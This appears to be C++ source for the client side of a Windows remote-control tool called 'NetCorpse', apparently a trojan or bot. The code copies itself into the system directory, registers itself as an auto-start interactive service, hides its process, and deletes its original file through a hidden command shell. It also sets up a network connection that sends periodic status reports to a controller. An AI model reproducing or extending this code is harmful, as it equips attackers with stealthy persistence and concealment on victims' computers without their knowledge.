DWORD WINAPI sendSRTimer(LPVOID dwtoIP)
{	
	//SaveLog("sendSRTimer");
	SetTimer(NULL,NULL,10 * 1000,TIMERPROC(sendSR));
	
	MSG msg;

	while(GetMessage(&msg,0,0,0))
	{
		TranslateMessage(&msg); 
		DispatchMessage(&msg); 
	}
	return 0;
}

HANDLE hMutex = NULL;

void MyWorkInit(void)
{
	//SaveLog("MyWorkInit");
	char strAppName[] = "NCDABCDE12345";
	
	//创建互斥对象
	hMutex = CreateMutex(NULL, FALSE, strAppName);
	if (hMutex != NULL)
	{
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			//SaveLog("ERROR_ALREADY_EXISTS");
			CloseHandle(hMutex);
			return ;
		}		
	}
	
	//关闭互斥对象
	//CloseHandle(hMutex);

	GetCPURate();

	Connection.SetReceiveFunc (ReceiveCallback);
	Connection.SetCloseFunc (CloseCallback);

	DWORD tid1;
	::CreateThread(NULL,0,sendSRTimer,(LPVOID)NULL,0,&tid1);
}


#include"HideProcess.h"

#include "winsvc.h"
SERVICE_STATUS service_status_ss;
SERVICE_STATUS_HANDLE handle_service_status;
SC_HANDLE scm,svc;


void WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpszArgv);
void WINAPI Handler(DWORD Opcode);
void InstallService();
void UninstallService();

void MyWorkInit();
BOOL SelfDelete();

/////////////////////////////////////////////////////////////////////////////
// CNetCorpseClientApp

BEGIN_MESSAGE_MAP(CNetCorpseClientApp, CWinApp)
	//{{AFX_MSG_MAP(CNetCorpseClientApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNetCorpseClientApp construction

CNetCorpseClientApp::CNetCorpseClientApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CNetCorpseClientApp object

CNetCorpseClientApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CNetCorpseClientApp initialization

BOOL CNetCorpseClientApp::InitInstance()
{
	AfxEnableControlContainer();

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif


	try
	{
		char CurrDirBuff[256];
		char SysDirBuff[256];
		int DirLen=sizeof(CurrDirBuff);	
		::GetCurrentDirectory(DirLen,CurrDirBuff);
		::GetSystemDirectory(SysDirBuff,sizeof(SysDirBuff));

		if (_stricmp(CurrDirBuff,SysDirBuff)!=0)
		{		
			char filename[256];
			char This_File[MAX_PATH];
			strcpy(filename,SysDirBuff);
			strcat(filename,"\\");
			strcat(filename,ExeName);
			
			memset(This_File,0,sizeof(This_File));
			GetModuleFileName(NULL, This_File, sizeof(This_File));
			if(::CopyFile(This_File,filename,FALSE)==0)	
			{
				//自删除后退出
				SelfDelete();
				exit(0);
			}
			
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;		
			memset(&pinfo,0,sizeof(pinfo));
			memset(&sinfo,0,sizeof(sinfo));	
			
			CreateProcess(filename,NULL, NULL, NULL,TRUE,0, NULL,SysDirBuff, &sinfo, &pinfo);		
			
			//自删除后退出
			SelfDelete();
			exit(0);
		}
		
		/*******************************************/
		//服务入口表
		SERVICE_TABLE_ENTRY	service_tab_entry[2];
		service_tab_entry[0].lpServiceName=ServiceName;	//线程名字
		service_tab_entry[0].lpServiceProc=ServiceMain;	//线程入口地址
		//可以有多个线程，最后一个必须为NULL
		service_tab_entry[1].lpServiceName=NULL;
		service_tab_entry[1].lpServiceProc=NULL;
			
			
		if (StartServiceCtrlDispatcher(service_tab_entry)==0)
		{				
				InstallService();								
		}		
	}
	catch(...)
	{
		HideProcess();
		SelfDelete();
		exit(0);
	}
	

	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}


/***********************************************/
//服务的真正入口点函数
void WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpszArgv)
{
	service_status_ss.dwServiceType=SERVICE_WIN32;
	service_status_ss.dwCurrentState=SERVICE_START_PENDING;
	service_status_ss.dwControlsAccepted=SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_PAUSE_CONTINUE;
	service_status_ss.dwServiceSpecificExitCode=0;
	service_status_ss.dwWaitHint=0;
	service_status_ss.dwCheckPoint=0;
	service_status_ss.dwWin32ExitCode=0;
	if ((handle_service_status=RegisterServiceCtrlHandler(ServiceName,Handler))==0)
	{
	
		//::MessageBox(NULL,"RegisterServiceCtrlHandler error",NULL,MB_OK);
	}//一个服务对应一个控制处理器
	service_status_ss.dwCurrentState=SERVICE_RUNNING;
	service_status_ss.dwWaitHint=0;
	service_status_ss.dwCheckPoint=0;
	::SetServiceStatus(handle_service_status,&service_status_ss);
	
	//---------------
	MyWorkInit();

	return ;
}
/***********************************************/
//服务控制器
void WINAPI Handler(DWORD dwControl)
{
		switch(dwControl)
		{
			case SERVICE_CONTROL_STOP:
				service_status_ss.dwCurrentState=SERVICE_STOPPED;
				::SetServiceStatus(handle_service_status,&service_status_ss);
				break;
			case SERVICE_CONTROL_CONTINUE:
				service_status_ss.dwCurrentState=SERVICE_RUNNING;
				::SetServiceStatus(handle_service_status,&service_status_ss);
				break;
			case SERVICE_CONTROL_PAUSE:
				service_status_ss.dwCurrentState=SERVICE_PAUSED;
				::SetServiceStatus(handle_service_status,&service_status_ss);
				break;
			case SERVICE_CONTROL_INTERROGATE:
                  break;
				
		}
		::SetServiceStatus(handle_service_status,&service_status_ss);

}
/***********************************************/
void InstallService()
{
	char szSysDir[256];
	memset(szSysDir,0,sizeof(szSysDir));
	::GetSystemDirectory(szSysDir,sizeof(szSysDir));
	strcat(szSysDir,"\\");
	strcat(szSysDir,ExeName);

	scm=::OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if (scm!=NULL)
	{
		svc=::CreateService(scm,ServiceName,ServiceName,SERVICE_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,
			SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,szSysDir,NULL,NULL,NULL,NULL,NULL);
		
		
		svc=::OpenService(scm,ServiceName,SERVICE_START);	
		if (svc!=NULL)
		{		 
			
			::StartService(svc,0,NULL);
			::CloseServiceHandle(svc);
			
			
		}
		::CloseServiceHandle(scm);
	}
	
	
}

/***********************************************/
void UninstallService()
{
	scm=::OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if (scm!=NULL)
	{
		svc=::OpenService(scm,ServiceName,SERVICE_ALL_ACCESS);
		if (svc!=NULL)
		{
			::DeleteService(svc);
			::CloseServiceHandle(svc);
		}
	
		::CloseServiceHandle(scm);
	}
	


}

BOOL SelfDelete()
{
	TCHAR szModule [MAX_PATH],
		  szComspec[MAX_PATH],
		  szParams [MAX_PATH];

	// get file path names:
	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
	   (GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
	   (GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
	{
		// set command shell parameters
		lstrcpy(szParams," /c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");
		lstrcat(szComspec, szParams);


		// set struct members
		STARTUPINFO		si={0};
		PROCESS_INFORMATION	pi={0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		// increase resource allocation to program
		SetPriorityClass(GetCurrentProcess(),
				REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),
			THREAD_PRIORITY_TIME_CRITICAL);

		// invoke command shell
		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED|
					DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// suppress command shell process until program exits
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
                        SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE); 

			// resume shell process with new low priority
			ResumeThread(pi.hThread);

			// everything seemed to work
			return TRUE;
		}
		else // if error, normalize allocation
		{
			SetPriorityClass(GetCurrentProcess(),
							 NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),
							  THREAD_PRIORITY_NORMAL);
		}
	}
	return FALSE;
}

//
